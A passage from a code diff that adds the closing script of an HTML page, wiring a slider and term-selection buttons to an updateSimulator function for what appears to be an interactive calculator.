+            slider.addEventListener('input', updateSimulator);
+
+            termButtons.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    termButtons.forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                    selectedTerm = parseInt(btn.dataset.term, 10);
+                    updateSimulator();
+                });
+            });
+
+            updateSimulator();
+        })();
+    </script>
+</body>
+</html>
